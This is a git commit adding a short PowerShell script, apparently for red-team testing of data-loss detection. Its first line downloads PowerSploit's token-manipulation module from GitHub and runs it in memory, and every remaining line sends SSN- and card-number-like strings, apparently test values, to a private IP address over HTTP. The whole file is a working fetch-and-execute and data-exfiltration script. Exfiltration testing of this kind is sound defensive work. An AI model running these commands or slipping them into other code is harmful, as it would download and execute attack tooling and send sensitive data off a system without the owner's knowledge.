46e41b0ee752d6a29aa1948fd98ffed5a3271b48
Scott Sutherland <scott.sutherland@nullbind.com>
2015-07-01 17:03:02 -0500

    Create Exfil-Http.ps1

---
+++ Brainstorming/Exfil-Http.ps1
@@ -0,0 +1,31 @@
+# download scripts 
+Invoke-Expression (new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1');
+
+# upload data
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=123-45-6789" | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=123456789" | out-null 
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=test123456789test" | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011 2089 4444 4440" | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011 2089 4444 4440"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011 2089 4444 4440"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011-2089-4444-4440"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011-2089-4444-4440"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011-2089-4444-4440"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011208944444440"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011208944444440"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011208944444440"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011208947270453"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011208947270453"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011208947270453"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011 9980 8140 9707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011 9980 8140 9707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011 9980 8140 9707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011-9980-8140-9707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011-9980-8140-9707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011-9980-8140-9707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011998081409707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011998081409707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011998081409707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=378282246310005"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=4012888888881881"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=4222222222222" | out-null
